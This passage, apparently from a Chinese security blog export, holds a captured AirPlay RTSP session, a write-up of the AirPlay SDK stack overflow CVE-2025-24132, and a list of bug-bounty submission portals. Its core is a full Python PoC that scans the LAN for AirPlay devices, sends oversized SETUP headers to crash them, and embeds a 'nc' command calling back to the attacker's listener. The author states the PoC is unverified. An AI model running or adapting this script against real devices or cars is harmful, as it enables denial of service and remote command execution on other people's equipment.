AirTunes/220.68</span><br><span class="line">CSeq: 6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 204</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 7</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00Wstreams]timestampInfoYlatencyMsTtype_streamConnectionID	</span><br><span class="line">TnameUSubSu</span><br><span class="line"></span><br><span class="line">UBePxT</span><br><span class="line">UAfPxT</span><br><span class="line">UBefEn</span><br><span class="line">UEmEncKn@9,6;PVY^dgmpvy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 85</span><br><span class="line">CSeq: 7</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00WstreamsnTtypeXdataPort</span><br><span class="line">!$238-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">7100端口传输媒体数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 58</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 58</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bplist00WstreamsTtypen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 42</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 59</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 59</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCP四次挥手 =======================</span><br></pre></td></tr></table></figure>
-
-<h2 id="CVE-2025-24132"><a href="#CVE-2025-24132" class="headerlink" title="CVE-2025-24132"></a>CVE-2025-24132</h2><ol>
-<li><p>CVE-2025-24132 漏洞的成因是基于栈的缓冲区溢出（stack-based buffer overflow），出现在Apple AirPlay SDK 处理网络数据包的代码路径中。漏洞位于AirPlay SDK的网络数据解析模块中，具体是在处理来自本地网络的AirPlay协议数据包时，未能正确验证输入数据的长度，导致栈缓冲区被溢出覆盖。需要测试人员和目标系统位于同一个局域网（能够相互通信就好）。迄今为止（2025年11月25日），没能找到可以成功复现漏洞的PoC以及exp，YouTuBe上面该漏洞的提交者演示了利用过程，但仍然没有公开PoC。</p>
-</li>
-<li><p>影响的范围</p>
-<ul>
-<li>Airplay 音频SDK：&lt;2.7.1</li>
-<li>Airplay 视频SDK：&lt;3.6.0</li>
-<li>Carplay通信SDK：&lt;R18.1</li>
-</ul>
-</li>
-<li><p>为什么Carplay会受到影响</p>
-<ul>
-<li>Carplay的无线通信机制底层依赖AirPlay协议栈，内部集成了AirPlay SDK，而该漏洞位于AirPlay SDK的网络数据解析模块中；</li>
-<li>利用CVE-2025-24132攻击Carplay：通过iAP2协议连接上车机并自动交互WiFi凭证（蓝牙链路） -&gt; 脚本攻击（WiFi链路）</li>
-</ul>
-</li>
-<li><p>网络嗅探分析版本</p>
-<ul>
-<li>wireshark抓取7000端口的流量：tcp.port&#x3D;&#x3D;7000</li>
-<li>找到发往tcp&#x2F;7000的数据包，在User-Agent字段中大概率会出现“Airplay&#x2F;xx.xx.xx”的协议版本号（非标准软件可能会进行修改）</li>
-</ul>
-</li>
-<li><p>airplay协议版本&amp;airplay SDK对应关系</p>
-<table>
-<thead>
-<tr>
-<th>协议版本（抓包 User-Agent）</th>
-<th>SDK 版本（MFi 内部）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>AirPlay&#x2F;210.x</td>
-<td>AirPlay Audio SDK &lt; 2.7.1</td>
-</tr>
-<tr>
-<td>AirPlay&#x2F;220.x</td>
-<td>AirPlay Audio SDK ≥ 2.7.1</td>
-</tr>
-<tr>
-<td>AirPlay&#x2F;310.x</td>
-<td>AirPlay Video SDK &lt; 3.6.0.126</td>
-</tr>
-<tr>
-<td>AirPlay&#x2F;320.x</td>
-<td>AirPlay Video SDK ≥ 3.6.0.126</td>
-</tr>
-<tr>
-<td>AirPlay&#x2F;420.x</td>
-<td>AirPlay Video SDK 3.8+</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>PoC样例（未能找到合适的目标验证有效性，仅作参考）</p>
- <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">A PoC script for CVE-2025-24132 is made by shaoxinSEC 25/11/2025.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> ifaddr</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys, socket, time, ipaddress</span><br><span class="line"><span class="keyword">from</span> zeroconf <span class="keyword">import</span> Zeroconf, ServiceBrowser, ServiceInfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- 配置 ----------</span></span><br><span class="line">OVERFLOW_SIZES = [<span class="number">0x1200</span>, <span class="number">0x2000</span>]   <span class="comment"># 4608 &amp; 8192</span></span><br><span class="line">LISTEN_ADDR = <span class="string">&quot;172.20.10.6&quot;</span>         <span class="comment"># 攻击机IP（尝试nc外带命令）</span></span><br><span class="line">LISTEN_PORT    = <span class="number">4445</span>               <span class="comment"># 攻击机PORT</span></span><br><span class="line">TIMEOUT        = <span class="number">3</span></span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"></span><br><span class="line">airplay_devices = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AirPlayListener</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        info = zc.get_service_info(type_, name)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            addr  = socket.inet_ntoa(info.addresses[<span class="number">0</span>])</span><br><span class="line">            port  = info.port</span><br><span class="line">            props = &#123;k.decode().lower(): v.decode() <span class="keyword">for</span> k, v <span class="keyword">in</span> info.properties.items()&#125;</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: addr,</span><br><span class="line">                <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: props.get(<span class="string">&#x27;model&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: props.get(<span class="string">&#x27;features&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_port</span>(<span class="params">ip, port, timeout=<span class="number">2</span></span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.settimeout(timeout)</span><br><span class="line">        <span class="keyword">return</span> s.connect_ex((ip, port)) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crash_target</span>(<span class="params">ip, port, size</span>):</span><br><span class="line">    cmd  = <span class="string">f&quot;echo CVE-2025-24132|nc <span class="subst">&#123;LISTEN_ADDR&#125;</span> <span class="subst">&#123;LISTEN_PORT&#125;</span>\n&quot;</span></span><br><span class="line">    pkt = (</span><br><span class="line">        <span class="string">f&quot;SETUP rtsp://<span class="subst">&#123;ip&#125;</span>/airplay RTSP/1.0\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;CSeq: 1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Session-ID: <span class="subst">&#123;<span class="string">&#x27;A&#x27;</span>*size&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Authorization: Basic <span class="subst">&#123;<span class="string">&#x27;B&#x27;</span>*<span class="number">0x400</span>&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;User-Agent: AirPlay/310.17 &quot;</span> + cmd + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line">    ).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">            s.settimeout(TIMEOUT)</span><br><span class="line">            s.connect((ip, port))</span><br><span class="line">            s.send(pkt)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heur_vuln</span>(<span class="params">model, features</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;旧model或低特征位 =&gt; 可能旧SDK&quot;&quot;&quot;</span></span><br><span class="line">    vuln_models = [<span class="string">&#x27;AppleTV2,1&#x27;</span>, <span class="string">&#x27;AirPort10,115&#x27;</span>, <span class="string">&#x27;CarPlay1,1&#x27;</span>, <span class="string">&#x27;Audio2,1&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(m <span class="keyword">in</span> model <span class="keyword">for</span> m <span class="keyword">in</span> vuln_models): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(features, <span class="number">16</span>) &amp; <span class="number">0xFF</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_ipv4_interfaces</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用本机所有的IPv4网络接口&quot;&quot;&quot;</span></span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> adapter <span class="keyword">in</span> ifaddr.get_adapters():</span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> adapter.ips:</span><br><span class="line">            <span class="keyword">if</span> ip.is_IPv4 <span class="keyword">and</span> <span class="keyword">not</span> ip.ip.startswith(<span class="string">&#x27;127.&#x27;</span>):</span><br><span class="line">                addrs.append(ip.ip)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(addrs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_airplay_info</span>(<span class="params">ip: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">7000</span>, timeout: <span class="built_in">float</span> = <span class="number">2.0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;先PTR扫实例名，再拿TXT，解决硬编码名字对不上的问题&quot;&quot;&quot;</span></span><br><span class="line">    zc = Zeroconf()</span><br><span class="line">    found = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 被动监听2秒，把同一IP的任何 *_airplay._tcp记录都拿到</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Snatcher</span>:</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">                info = zc.get_service_info(type_, name)</span><br><span class="line">                <span class="keyword">if</span> info <span class="keyword">and</span> socket.inet_ntoa(info.addresses[<span class="number">0</span>]) == ip <span class="keyword">and</span> info.port == port:</span><br><span class="line">                    <span class="keyword">nonlocal</span> found</span><br><span class="line">                    found = info</span><br><span class="line">            remove_service = update_service = <span class="keyword">lambda</span> *_: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        browser = ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, Snatcher())</span><br><span class="line">        time.sleep(timeout)</span><br><span class="line">        browser.cancel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: found.name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: found.properties.get(<span class="string">b&#x27;model&#x27;</span>, <span class="string">b&#x27;Unknown&#x27;</span>).decode(),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: <span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(found.properties.get(<span class="string">b&#x27;features&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>), <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        zc.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:                 <span class="comment"># 指定单个目标</span></span><br><span class="line">        ip, port = sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">7000</span></span><br><span class="line">        info = query_airplay_info(ip, port)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            airplay_devices.append(&#123;**info, <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Manual-Target&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: <span class="string">&#x27;Unknown&#x27;</span>, <span class="string">&#x27;features&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">else</span>:                                 <span class="comment"># 监听所有网络接口</span></span><br><span class="line">        interfaces = get_all_ipv4_interfaces()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 将在以下接口监听mDNS：&quot;</span>, interfaces)</span><br><span class="line">        zc = Zeroconf(interfaces=interfaces)</span><br><span class="line">        ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, AirPlayListener())</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        zc.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> airplay_devices:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 未发现任何AirPlay设备&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> dev <span class="keyword">in</span> airplay_devices:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 设备<span class="subst">&#123;dev[<span class="string">&#x27;name&#x27;</span>]&#125;</span>  <span class="subst">&#123;dev[<span class="string">&#x27;ip&#x27;</span>]&#125;</span>:<span class="subst">&#123;dev[<span class="string">&#x27;port&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    model=<span class="subst">&#123;dev[<span class="string">&#x27;model&#x27;</span>]&#125;</span>  features=0x<span class="subst">&#123;dev[<span class="string">&#x27;features&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] 端口不通，跳过&quot;</span>); <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> heur_vuln(dev[<span class="string">&#x27;model&#x27;</span>], dev[<span class="string">&#x27;features&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] 可能使用旧SDK，尝试进行溢出并执行命令&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] 版本特征较新，尝试进行溢出并执行命令&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 本地临时监听回显</span></span><br><span class="line">        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        listener.settimeout(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            listener.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, LISTEN_PORT))</span><br><span class="line">            listener.listen(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            listener = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> sz <span class="keyword">in</span> OVERFLOW_SIZES:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [*] 已发送 <span class="subst">&#123;sz&#125;</span>B 溢出载荷&quot;</span>)</span><br><span class="line">            crash_target(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>], sz)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            still_up = check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> still_up:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [!!!]<span class="subst">&#123;sz&#125;</span>B成功触发崩溃 → 漏洞存在！&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] 漏洞可能已修复&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> listener:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                conn, _ = listener.accept()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;CVE-2025-24132&quot;</span> <span class="keyword">in</span> conn.recv(<span class="number">128</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;    [!!!] 同时收到命令回显 → 可利用&quot;</span>)</span><br><span class="line">                conn.close()</span><br><span class="line">            <span class="keyword">except</span> socket.timeout: <span class="keyword">pass</span></span><br><span class="line">            listener.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           __                                      __             ______   ________   ______  </span></span><br><span class="line"><span class="string">          /  |                                    /  |           /      \\ /        | /      \\ </span></span><br><span class="line"><span class="string">  _______ $$ |____    ______    ______   __    __ $$/  _______  /$$$$$$  |$$$$$$$$/ /$$$$$$  |</span></span><br><span class="line"><span class="string"> /       |$$      \\  /      \\  /      \\ /  \\  /  |/  |/       \\ $$ \\__$$/ $$ |__    $$ |  $$/ </span></span><br><span class="line"><span class="string">/$$$$$$$/ $$$$$$$  | $$$$$$  |/$$$$$$  |$$  \\/$$/ $$ |$$$$$$$  |$$      \\ $$    |   $$ |      </span></span><br><span class="line"><span class="string">$$      \\ $$ |  $$ | /    $$ |$$ |  $$ | $$  $$&lt;  $$ |$$ |  $$ | $$$$$$  |$$$$$/    $$ |   __ </span></span><br><span class="line"><span class="string"> $$$$$$  |$$ |  $$ |/$$$$$$$ |$$ \\__$$ | /$$$$  \\ $$ |$$ |  $$ |/  \\__$$ |$$ |_____ $$ \\__/  |</span></span><br><span class="line"><span class="string">/     $$/ $$ |  $$ |$$    $$ |$$    $$/ /$$/ $$  |$$ |$$ |  $$ |$$    $$/ $$       |$$    $$/ </span></span><br><span class="line"><span class="string">$$$$$$$/  $$/   $$/  $$$$$$$/  $$$$$$/  $$/   $$/ $$/ $$/   $$/  $$$$$$/  $$$$$$$$/  $$$$$$/  </span></span><br><span class="line"><span class="string">                                                                     Detect CVE-2025-24132</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>威胁情报</category>
-      </categories>
-      <tags>
-        <tag>溢出漏洞、RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SRC挖掘</title>
-    <url>/SRC%E6%8C%96%E6%8E%98.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
-
-<table>
-<thead>
-<tr>
-<th align="center">Name</th>
-<th align="center">Link</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">字节跳动安全应急响应中心</td>
-<td align="center"><a href="https://security.bytedance.com/submit">https://security.bytedance.com/submit</a></td>
-</tr>
-<tr>
-<td align="center">腾讯安全应急响应中心</td>
-<td align="center"><a href="https://security.tencent.com/index.php/report/add">https://security.tencent.com/index.php/report/add</a></td>
-</tr>
-<tr>
-<td align="center">阿里安全应急响应中心</td>
-<td align="center"><a href="https://security.alibaba.com/">https://security.alibaba.com/</a></td>
-</tr>
-<tr>
-<td align="center">京东安全应急响应中心</td>
-<td align="center"><a href="http://security.jd.com/">http://security.jd.com/</a></td>
-</tr>
-<tr>
-<td align="center">百度安全应急响应中心</td>
-<td align="center"><a href="http://sec.baidu.com/views/main/loophole.html#home">http://sec.baidu.com/views/main/loophole.html#home</a></td>
-</tr>
-<tr>
-<td align="center">顺丰安全应急响应中心</td>
-<td align="center"><a href="http://sfsrc.sf-express.com/submitBug">http://sfsrc.sf-express.com/submitBug</a></td>
-</tr>
-<tr>
-<td align="center">360应急响应中心</td>
-<td align="center"><a href="https://security.360.cn/Report/index">https://security.360.cn/Report/index</a></td>
-</tr>
-<tr>
-<td align="center">哔哩哔哩安全应急响应中心</td>
-<td align="center"><a href="https://security.bilibili.com/">https://security.bilibili.com/</a></td>
-</tr>
-<tr>
-<td align="center">爱奇艺安全应急响应中心</td>
-<td align="center"><a href="https://security.iqiyi.com/#submit">https://security.iqiyi.com/#submit</a></td>
-</tr>
-<tr>
-<td align="center">蚂蚁集团安全应急响应中心</td>
-<td align="center"><a href="https://security.alipay.com/sc/afsrc/home.htm">https://security.alipay.com/sc/afsrc/home.htm</a></td>
-</tr>
-<tr>
-<td align="center">BIGO SRC</td>
-<td align="center"><a href="https://security.bigo.sg/#/submittingReport">https://security.bigo.sg/#/submittingReport</a></td>
-</tr>
-<tr>
-<td align="center">贝壳安全应急响应中心</td>
-<td align="center"><a href="https://security.ke.com/vuls">https://security.ke.com/vuls</a></td>
-</tr>
-<tr>
-<td align="center">360漏洞云众包</td>
-<td align="center"><a href="https://src.360.net/home">https://src.360.net/home</a></td>
-</tr>
-<tr>
-<td align="center">58安全应急响应中心</td>
-<td align="center"><a href="https://security.58.com/">https://security.58.com/</a></td>
-</tr>
-<tr>
-<td align="center">滴滴出行安全应急响应中心</td>
-<td align="center"><a href="http://sec.didichuxing.com/">http://sec.didichuxing.com/</a></td>
-</tr>
-<tr>
-<td align="center">东方财富安全应急响应中心</td>
-<td align="center"><a href="https://passport2.eastmoney.com/pub/login?backurl=https://se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf">https://passport2.eastmoney.com/pub/login?backurl=https%3A//se//A//security.eastmoney.com/checklogin/Oj2EK64eudkAwPvb8whTTvUWqkDW87hPs3tcMijf</a></td>
-</tr>
-<tr>
-<td align="center">斗鱼安全应急响应中心</td>
-<td align="center"><a href="https://security.douyu.com/">https://security.douyu.com/</a></td>
-</tr>
-<tr>
-<td align="center">安全应急响应中心</td>
-<td align="center"><a href="https://security.duxiaoman.com/views/main/loophole.html#home">https://security.duxiaoman.com/views/main/loophole.html#home</a></td>
-</tr>
-<tr>
-<td align="center">DHgate安全应急响应中心</td>
-<td align="center"><a href="http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html">http://dhsrc.dhgate.com/user.php/login/index/callback/post-add.html</a></td>
-</tr>
-<tr>
-<td align="center">富友安全应急响应中心</td>
-<td align="center"><a href="https://fsrc.fuiou.com/">https://fsrc.fuiou.com/</a></td>
-</tr>
-<tr>
-<td align="center">货拉拉安全应急响应中心</td>
-<td align="center"><a href="https://llsrc.huolala.cn/">https://llsrc.huolala.cn/</a></td>
-</tr>
-<tr>
-<td align="center">合合安全应急响应中心</td>
-<td align="center"><a href="https://security.intsig.com/">https://security.intsig.com/</a></td>
-</tr>
-<tr>
-<td align="center">火线安全平台</td>
-<td align="center"><a href="https://www.huoxian.cn/login">https://www.huoxian.cn/login</a></td>
-</tr>
-<tr>
-<td align="center">好未来安全应急响应中心</td>
-<td align="center"><a href="http://src.100tal.com/">http://src.100tal.com/</a></td>
-</tr>
-<tr>
-<td align="center">华为安全激励计划</td>
-<td align="center"><a href="https://bugbounty.huawei.com/">https://bugbounty.huawei.com/</a></td>
-</tr>
-<tr>
-<td align="center">焦点安全应急响应中心</td>
-<td align="center"><a href="https://security.focuschina.com/home/index/report.html">https://security.focuschina.com/home/index/report.html</a></td>
-</tr>
-<tr>
-<td align="center">竞技安全应急响应中心</td>
-<td align="center"><a href="https://security.jj.cn/">https://security.jj.cn/</a></td>
-</tr>
-<tr>
-<td align="center">快手安全应急响应中心</td>
-<td align="center"><a href="https://security.kuaishou.com/#/submit">https://security.kuaishou.com/#/submit</a></td>
-</tr>
-<tr>
-<td align="center">联想安全应急响应中心</td>
-<td align="center"><a href="https://lsrc.vulbox.com/">https://lsrc.vulbox.com/</a></td>
-</tr>
-<tr>
-<td align="center">同程旅行安全应急响应中心</td>
-<td align="center"><a href="https://sec.ly.com/">https://sec.ly.com/</a></td>
-</tr>
-<tr>
-<td align="center">美丽联合集团安全应急响应中心</td>
-<td align="center"><a href="http://security.mogujie.com/#/">http://security.mogujie.com/#/</a></td>
-</tr>
-<tr>
-<td align="center">魅族安全应急响应中心</td>
-<td align="center"><a href="https://sec.meizu.com/">https://sec.meizu.com/</a></td>
-</tr>
-<tr>
-<td align="center">陌陌安全应急响应中心</td>
-<td align="center"><a href="https://security.immomo.com/">https://security.immomo.com/</a></td>
-</tr>
-<tr>
-<td align="center">马蜂窝安全应急响应中心</td>
-<td align="center"><a href="https://security.mafengwo.cn/submit">https://security.mafengwo.cn/submit</a></td>
-</tr>
-<tr>
-<td align="center">美团安全应急响应中心</td>
-<td align="center"><a href="https://security.meituan.com/">https://security.meituan.com/</a></td>
-</tr>
-<tr>
-<td align="center">OPPO安全应急响应中心</td>
-<td align="center"><a href="https://security.oppo.com/add.jsp">https://security.oppo.com/add.jsp</a></td>
-</tr>
-<tr>
-<td align="center">网易安全中心</td>
-<td align="center"><a href="http://anquan.163.com/module/hole/new-hole.html">http://anquan.163.com/module/hole/new-hole.html</a></td>
-</tr>
-<tr>
-<td align="center">平安安全应急响应中心</td>
